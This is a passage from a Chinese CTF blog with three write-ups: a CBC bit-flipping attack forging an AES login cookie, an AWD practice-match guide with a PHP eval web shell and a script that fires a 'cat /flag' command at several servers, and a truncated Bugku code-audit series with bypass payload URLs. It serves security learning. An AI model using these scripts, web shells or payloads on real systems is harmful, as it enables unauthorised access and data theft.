base64_encode($cipher)); // 初始向量加密，aes后的明文再加密(base64)</span><br><span class="line">&#125; </span><br><span class="line">function show_homepage()&#123;</span><br><span class="line">    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123; ## 得到flag条件是我们Session里面的username为admin</span><br><span class="line">        echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Flag is *************&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;); ## 这里全部解密，反序列化，来检查login</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&apos;username&apos;])&amp;&amp;isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">  $username=waf((string)$_POST[&apos;username&apos;]);</span><br><span class="line">  $password=waf((string)$_POST[&apos;password&apos;]);</span><br><span class="line">  if($username === &apos;admin&apos;)&#123;</span><br><span class="line">  	#如果username是admin的话，就会显示下面这句话然后退出</span><br><span class="line">        exit(&apos;&lt;p&gt;You are not real admin!&lt;/p&gt;&apos;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">  if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我加了一些注释方便理解代码<br></p>
<ul>
<li>define(“METHOD”, “aes-128-cbc”) 说明采用的是aes-128-cbc模式加密</li>
<li>在show_homepage()函数中，只要$_SESSION[“username”]===’admin’就可以得到flag</li>
<li>然后观察哪里会用到show_homepage()这个函数</li>
</ul>
<p><img src="http://p1vrkwaxt.bkt.clouddn.com/PT%5D%7BL~%28AF%7DVB4%7D1%7B1D_7Y15.png" alt="image"></p>
<ul>
<li>如图可见有两个地方，这两个分别有login和check_login函数，其实就是互逆关系，下面给出login大概步骤图</li>
</ul>
<p><img src="http://p1vrkwaxt.bkt.clouddn.com/%28~IEKDBOQG3CFG@ZCUK5%7D_G.png" alt="image"></p>
<ul>
<li>login()函数中<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>但后面说传入username的若为admin，则exit，显然不行的<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($username === &apos;admin&apos;)&#123;</span><br><span class="line"> 	#如果username是admin的话，就会显示下面这句话然后退出</span><br><span class="line">       exit(&apos;&lt;p&gt;You are not real admin!&lt;/p&gt;&apos;);</span><br></pre></td></tr></table></figure></p>
<ul>
<li>另外一个check_login其实就是login逆过来了<br></li>
</ul>
<p>在正常情况下，如果我们正正经经地post一个账户名和口令字，这个网页就会把你post的东西经过login那一系列的变化，用cookie保存下来，然后下次我们不需要再post东西了，凭借cookie，网站通过check_login得到我们post过得账户名和口令字，就能知道我们的身份。</p>
<p>这样经过check_login函数之后，$_SESSION[‘username’]就还是我们最开始post的那个username。</p>
<p>但我们是正经人吗？我们是要搞事get flag的人，所以我们就要想如何把$_SESSION[‘username’]变成admin，</p>
<p>即使我们最开始post的可能是admi2，</p>
<p>但是它经过了AES加密和解密</p>
<p>这里就要用到CBC字节翻转攻击</p>
<p>攻击的point就在check_login()的解密过程里。</p>
<h3 id="总的来说就是只有admin用户才能读取flag，但是admin用户又不允许登录。虽然相互矛盾，由于题目用到了aes的cbc模式加密，所以我们可以利用cbc字节翻转攻击来得到我们想要的明文。"><a href="#总的来说就是只有admin用户才能读取flag，但是admin用户又不允许登录。虽然相互矛盾，由于题目用到了aes的cbc模式加密，所以我们可以利用cbc字节翻转攻击来得到我们想要的明文。" class="headerlink" title="总的来说就是只有admin用户才能读取flag，但是admin用户又不允许登录。虽然相互矛盾，由于题目用到了aes的cbc模式加密，所以我们可以利用cbc字节翻转攻击来得到我们想要的明文。"></a>总的来说就是只有admin用户才能读取flag，但是admin用户又不允许登录。虽然相互矛盾，由于题目用到了aes的cbc模式加密，所以我们可以利用cbc字节翻转攻击来得到我们想要的明文。</h3><h2 id="CBC字节翻转攻击原理"><a href="#CBC字节翻转攻击原理" class="headerlink" title="CBC字节翻转攻击原理"></a>CBC字节翻转攻击原理</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/1309588-20180510174331438-564764964.png" alt="image"></p>
<p>CBC，就是每个明文块先与前一个密文块进行异或后，再进行加密<br><br>(下面复制一个例子参考)<br><br>【复制粘贴开始】</p>
<p>比方说，我们有这样的明文序列：</p>
<p>a:2:{s:4:”name”;s:6:”sdsdsd”;s:8:”greeting”;s:20:”echo ‘Hello sdsdsd!’”;}</p>
<p>我们的目标是将“s:6”当中的数字6转换成数字“7”。我们需要做的第一件事就是把明文分成16个字节的块：</p>
<p>• Block 1:a:2:{s:4:”name”;</p>
<p>• Block 2:s:6:”sdsdsd”;s:8</p>
<p>• Block 3::”greeting”;s:20</p>
<p>• Block 4::”echo ‘Hello sd</p>
<p>• Block 5:sdsd!’”;}</p>
<p>因此，我们的目标字符位于块2，这意味着我们需要改变块1的密文来改变第二块的明文。</p>
<p>有一条经验法则是（注：结合上面的说明图可以得到），你在密文中改变的字节，只会影响到在下一明文当中，具有相同偏移量的字节。所以我们目标的偏移量是2：</p>
<p>• [0] = s</p>
<p>• 1 = :</p>
<p>• 2 =6</p>
<p>因此我们要改变在第一个密文块当中，偏移量是2的字节。正如你在下面的代码当中看到的，在第2行我们得到了整个数据的密文，然后在第3行中，我们改变块1中偏移量为2的字节，最后我们再调用解密函数。</p>
<p>$v = “a:2:{s:4:”name”;s:6:”sdsdsd”;s:8:”greeting”;s:20:”echo ‘Hello sdsdsd!’”;}”;</p>
<p>$enc = @encrypt($v);</p>
<p>$enc[2] = chr(ord($enc[2]) ^ ord(“6”) ^ ord (“7”));</p>
<p>$b = @decrypt($enc);</p>
<p>运行这段代码后，我们可以将数字6变为7：</p>
<p>但是我们在第3行中，是如何改变字节成为我们想要的值呢？</p>
<p>基于上述的解密过程，我们知道有，A = Decrypt(Ciphertext)与B = Ciphertext-N-1异或后最终得到C = 6。等价于：</p>
<p>C = A XOR B</p>
<p>所以，我们唯一不知道的值就是A（注：对于B，C来说）（block cipher decryption）;借由XOR，我们可以很轻易地得到A的值：</p>
<p>A = B XOR C</p>
<p>最后，A XOR B XOR C等于0。有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，就像这样：</p>
<p>A XOR B XOR C XOR “7”会在块2的明文当中，偏移量为2的字节处得到7。</p>
<p>【复制粘贴结束】</p>
<h2 id="题目进行CBC字节翻转攻击"><a href="#题目进行CBC字节翻转攻击" class="headerlink" title="题目进行CBC字节翻转攻击"></a>题目进行CBC字节翻转攻击</h2><p>这里我们尝试admi2,首先在本地phpstudy生成明文序列<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$info = array(&apos;username&apos;=&gt;&apos;admi2&apos;,&apos;password&apos;=&gt;&apos;Password&apos;);</span><br><span class="line">echo serialize($info);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admi2&quot;;s:8:&quot;password&quot;;s:8:&quot;Password&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>同样地分成16个字节的块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;userna</span><br><span class="line">me&quot;;s:5:&quot;admi2&quot;;</span><br><span class="line">s:8:&quot;password&quot;;s</span><br><span class="line">:8:&quot;Password&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>要修改第二行的第13个2 -&gt; n ,按照CBC字节翻转攻击的套路，我们要修改的是上一个分组对应位置的密文, 即修改第一行的第13个r</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import base64</span><br><span class="line">from urllib import unquote</span><br><span class="line">from urllib import quote_plus</span><br><span class="line">bs = &apos;PFTchi6G9vZxttcQECnYNOQYYfo9qENaEX80uR45Wulnekb0WfZMTH7QKYTm3Lqk4WYwKIYmPv8GahlmDsQYCw%3D%3D&apos;</span><br><span class="line">#密文cipher，从Chrome的插件EditThisCookie可以很轻松get到/抓包也可以</span><br><span class="line">bs = unquote(bs)</span><br><span class="line">#url解码</span><br><span class="line">bs_de = base64.b64decode(bs)</span><br><span class="line">#base64解码</span><br><span class="line"></span><br><span class="line">ch = chr(ord(bs_de[13]) ^ ord(&apos;2&apos;) ^ ord(&apos;n&apos;))</span><br><span class="line">bs_de=bs_de[0:13]+ch+bs_de[14::]</span><br><span class="line">#其实就是bs_de[13]=chr(ord(bs_de[13]) ^ ord(&apos;2&apos;) ^ ord(&apos;n&apos;))</span><br><span class="line">#因为python里面字符串不可变，即你直接bs_de = &apos;a&apos;这样会报错</span><br><span class="line"></span><br><span class="line">rs = base64.b64encode(bs_de)</span><br><span class="line">#print rs</span><br><span class="line">print quote_plus(rs)</span><br></pre></td></tr></table></figure>
<p>cipher应该是经过cbc模式下aes加密后最后的密文（挺不好理解的多看看几遍就行了）</p>
<p>首先第一行填admi2，第二行碰都不要碰（它会自动帮你填充Password，如果点击了一下Password就gg为空了）然后抓包(重新按回车)</p>
<p><img src="http://p1vrkwaxt.bkt.clouddn.com/B%60DMGX52FIYI2N79_E4R~ZK.png" alt="image"></p>
<p>然后上刚刚的脚本生成密文替换抓包里面的密文，然后运行一下看看</p>
<p><img src="http://p1vrkwaxt.bkt.clouddn.com/%5B0FUDRN_%5B@7%5DM%60_BDE$BOZJ.png" alt="image"></p>
<p>报错是因为我们换成了新密文，不是刚才的密文，反序列化失败是正常的，把里面的base64码进行编码如下:</p>
<p><img src="http://p1vrkwaxt.bkt.clouddn.com/2W4@S%60%2858MJJM38K%290UK%299S.png" alt="image"></p>
<p>可以看到有admin，我们刚开始输入的是amin2，说明转换成功，所以下一步我们就要用相同的套路，来复原第一个密文分组，也就是初始向量。接下来改变一下初始向量vi，上脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">from urllib import unquote</span><br><span class="line">from urllib import quote_plus</span><br><span class="line"></span><br><span class="line">mingwen_de=&apos;nj7W9vwn0gxyOdX3xUN/lG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjg6IlBhc3N3b3JkIjt9&apos;</span><br><span class="line">#base64_decode(&apos;这里面的&apos;) can&apos;t unserialize</span><br><span class="line">mingwen = base64.b64decode(mingwen_de)</span><br><span class="line">print mingwen</span><br><span class="line"></span><br><span class="line">iv = &apos;cFDYuzPtN1Q5ETd1E7s1Zw%3D%3D&apos;</span><br><span class="line">#此时cookie里的iv</span><br><span class="line">iv = unquote(iv)</span><br><span class="line">iv_de = base64.b64decode(iv)</span><br><span class="line">new = &apos;a:2:&#123;s:8:&quot;userna&apos;</span><br><span class="line">for i in range(16):</span><br><span class="line">    iv_de = iv_de[:i] + chr(ord(iv_de[i]) ^ ord(mingwen[i]) ^ ord(new[i])) + iv_de[i+1:]</span><br><span class="line">#iv_de[i]=chr(ord(iv_de[i]) ^ ord(mingwen[i]) ^ ord(new[i]))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(iv_de))</span><br><span class="line">#用这个结果把原来的iv换掉</span><br></pre></td></tr></table></figure>
<p>之后就容易多了，这其中，iv_de就是IV，mingwen就是当前它解密出来的明文，也就是我们要改的，new是正确的明文，就是我们想要改变的.</p>
<p>修改后运行得到flag</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-CTFawd" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2018/07/06/CTFawd/" class="article-date">
      <time datetime="2018-07-06T05:24:35.523Z" itemprop="datePublished">2018-07-06</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2018/07/06/CTFawd/">AWD 校内练习赛</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="本人没打过awd模式，和pwn大佬组队打了场练习赛，学到了很多，下面作总结一下经验"><a href="#本人没打过awd模式，和pwn大佬组队打了场练习赛，学到了很多，下面作总结一下经验" class="headerlink" title="本人没打过awd模式，和pwn大佬组队打了场练习赛，学到了很多，下面作总结一下经验."></a>本人没打过awd模式，和pwn大佬组队打了场练习赛，学到了很多，下面作总结一下经验.</h3><h2 id="AWD模式"><a href="#AWD模式" class="headerlink" title="AWD模式"></a>AWD模式</h2><p>AWD：Attack With Defence，比赛中每个队伍维护多台服务器，服务器中存在多个漏洞，利用漏洞攻击其他队伍可以进行得分，修复漏洞可以避免被其他队伍攻击失分。</p>
<ul>
<li>一般分配Web服务器，服务器（多数为Linux）某处存在flag（一般在根目录下）；</li>
<li>可能会提供一台流量分析虚拟机，可以下载流量文件进行数据分析；</li>
<li>flag在主办方的设定下每隔一定时间刷新一轮；</li>
<li>各队一般都有自己的初始分数；</li>
<li>flag一旦被其他队伍拿走，该队扣除一定积分；</li>
<li>扣除的积分由获取flag的队伍均分；</li>
<li>主办方会对每个队伍的服务进行check，服务宕机扣除本轮flag分数，扣除的分值由服务check正常的队伍均分；</li>
<li>一般每个队伍会给一个低权限用户，非root权限；<h2 id="赛前准备"><a href="#赛前准备" class="headerlink" title="赛前准备"></a>赛前准备</h2></li>
<li>做好备份,在龙哥指导下,下载了Winscp建立起站点,按照说明书给的题目ip进行会话连接,可以看到自己的flag和源代码题目目录等等,这就是自己的flag与目录了。然后将这些所有文件夹进行复制备份,龙哥说可以在被入侵时删掉这些后门重新放进去备份.</li>
<li>比赛可能会告诉你其他队伍的IP，也可能不会告诉你，一般在同一个C段或者B段，因此首先可以利用nmap等扫描工具发现其他队伍的IP</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –sn 192.168.71.0/24</span><br></pre></td></tr></table></figure>
<p>或者用<a href="https://github.com/zer0h/httpscan" target="_blank" rel="noopener">https://github.com/zer0h/httpscan</a> 的脚本进行扫描 </p>
<h2 id="预留后门"><a href="#预留后门" class="headerlink" title="预留后门"></a>预留后门</h2><ul>
<li>这里我用的webshell检测工具D盾,可以对源代码查出漏洞问题，从而进行挖洞以及自身后门的防备。这里的备份很关键，方便自己找出后门漏洞。</li>
<li>拿到源代码后立刻用D盾进行扫描<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/XWUQ185~YHF1ON@2C83A08J.png" alt="image"><br>可以看到许多漏洞,最简单的是一句话木马.<br><br>比赛题型有很多，就拿我做的一道最简单的一句话木马来作例子<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@eval($_POST[&quot;HDwiki&quot;]);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>这题有两种方法<br></p>
<ul>
<li><p>构造post如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HDwiki=system(&apos;cat ./flag&apos;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>也可以用菜刀连接，方便直观flag的目录所在，还可以上传一句话木马防备对手进行删掉原有的一句话木马</p>
</li>
<li>写脚本爆破，下面附上龙哥写的脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url_submit = &quot;http://172.16.4.1/Common/submitAnswer&quot;</span><br><span class="line"></span><br><span class="line">url_test = &quot;http://172.16.5.20:5050/index.php&quot;</span><br><span class="line">url = [</span><br><span class="line">	&quot;http://172.16.5.14:5050/index.php&quot;,</span><br><span class="line">	&quot;http://172.16.5.13:5050/index.php&quot;,</span><br><span class="line">	&quot;http://172.16.5.16:5050/index.php&quot;,</span><br><span class="line">	&quot;http://172.16.5.15:5050/index.php&quot;,</span><br><span class="line">	&quot;http://172.16.5.20:5050/index.php&quot;,</span><br><span class="line">	&quot;http://172.16.5.19:5050/index.php&quot;,</span><br><span class="line">	&quot;http://172.16.5.18:5050/index.php&quot;,</span><br><span class="line">	&quot;http://172.16.5.17:5050/index.php&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">post_data = &#123;&apos;HDwiki&apos;:&quot;system(&apos;cat /flag&apos;);&quot;&#125;</span><br><span class="line"></span><br><span class="line">token = &apos;f7dfe4ef29acdf1036bd971e3488c5f6&apos;</span><br><span class="line"></span><br><span class="line"># submit_flag = &#123;&apos;answer&apos;:flag,&apos;token&apos;:token&#125;</span><br><span class="line">for i in url:</span><br><span class="line">	response = requests.post(i, data = post_data)</span><br><span class="line">	print(response.text[0:36])</span><br><span class="line">	flag = response.text[0:36]</span><br><span class="line">	# if &quot;flag&quot; in response.text:</span><br><span class="line">	# 	print(&quot;flag in &quot;)</span><br><span class="line">	# print(token)</span><br><span class="line">	sub_response = requests.post(url_submit,data = &#123;&apos;answer&apos;:flag,&apos;token&apos;:token&#125;)</span><br><span class="line">	print(sub_response.text)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>这只是校内练习赛而已，第一次接触awd模式的CTF学到了很多，上面方法有点水不能在真正赛场用，有点慢，一般都走写脚本。祝大家打比赛快乐。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-bugkuCTF 代码审计" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2018/07/06/bugkuCTF 代码审计/" class="article-date">
      <time datetime="2018-07-06T05:24:35.523Z" itemprop="datePublished">2018-07-06</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2018/07/06/bugkuCTF 代码审计/">Bugku 代码审计</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="0x01-extract变量覆盖"><a href="#0x01-extract变量覆盖" class="headerlink" title="0x01 extract变量覆盖"></a>0x01 extract变量覆盖</h2><p>题目给出如下源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag=&apos;xxx&apos;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($shiyan))</span><br><span class="line">&#123;</span><br><span class="line">$content=trim(file_get_contents($flag));</span><br><span class="line">if($shiyan==$content)</span><br><span class="line">&#123;</span><br><span class="line">echo&apos;flag&#123;xxx&#125;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo&apos;Oh.no&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>这里主要用到了extract()变量覆盖函数,百度的解释是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">extract()函数能将变量从数组导入当前的符号表</span><br><span class="line">extract(array,extract_rules,prefix)</span><br><span class="line">extract_rules:EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当extract()函数从用户可以控制的数组中导出变量时,可能发生变量覆盖，在这个例子中，extract()从$_GET中导出变量，从而可以导致任意变量被覆盖.</span><br></pre></td></tr></table></figure>
<p>构造payload如下:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/1.php?shiyan=&amp;flag=</span><br></pre></td></tr></table></figure></p>
<p>这里因为我们不知道flag是什么，尝试让这两个都为空.</p>
<p>得到flag{bugku-dmsj-p2sm3N}</p>
<h2 id="0x02-strcmp比较字符串"><a href="#0x02-strcmp比较字符串" class="headerlink" title="0x02 strcmp比较字符串"></a>0x02 strcmp比较字符串</h2><p>题目给出的源代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class="line">if (isset($_GET[&apos;a&apos;])) &#123;</span><br><span class="line">if (strcmp($_GET[&apos;a&apos;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line">//比较两个字符串（区分大小写）</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">print &apos;No&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>构造payload:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/6.php?a[]=1</span><br></pre></td></tr></table></figure></p>
<p>因为strcmp这个函数无法识别数组从而报错为0</p>
<h2 id="0x03-urldecode二次编码绕过"><a href="#0x03-urldecode二次编码绕过" class="headerlink" title="0x03 urldecode二次编码绕过"></a>0x03 urldecode二次编码绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id]))</span><br><span class="line">&#123;</span><br><span class="line">echo(&quot;not allowed!&quot;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] == &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;Access granted!&quot;;</span><br><span class="line">echo &quot;flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>利用了两次urldecode第一次是浏览器的解码第二次是函数的解码 </p>
<p>构造payload:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/10.php?id=hacker%2544J</span><br></pre></td></tr></table></figure></p>
<h2 id="0x04-md5-函数"><a href="#0x04-md5-函数" class="headerlink" title="0x04 md5()函数"></a>0x04 md5()函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">if (isset($_GET[&apos;username&apos;]) and isset($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">if ($_GET[&apos;username&apos;] == $_GET[&apos;password&apos;])</span><br><span class="line">print &apos;Your password can not be your username.&apos;;</span><br><span class="line">else if (md5($_GET[&apos;username&apos;]) === md5($_GET[&apos;password&apos;]))</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">print &apos;Invalid password&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里的md5函数漏洞和strcmp漏洞一样，也一样无法识别数组<br><br>构造payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/18.php?username[]=1&amp;password[]=2</span><br></pre></td></tr></table></figure></p>
<h2 id="0x05-数组返回NULL绕过"><a href="#0x05-数组返回NULL绕过" class="headerlink" title="0x05 数组返回NULL绕过"></a>0x05 数组返回NULL绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line"></span><br><span class="line">if (isset ($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)</span><br><span class="line">echo &apos;You password must be alphanumeric&apos;;</span><br><span class="line">else if (strpos 